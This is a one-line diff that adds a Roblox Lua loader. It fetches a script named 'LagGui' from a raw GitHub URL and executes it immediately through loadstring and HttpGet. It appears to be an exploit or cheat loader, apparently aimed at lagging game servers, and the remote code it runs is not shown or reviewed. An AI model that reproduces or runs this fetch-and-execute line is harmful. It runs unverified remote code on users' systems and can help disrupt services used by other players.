@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/SB/refs/heads/main/LagGui",true))()
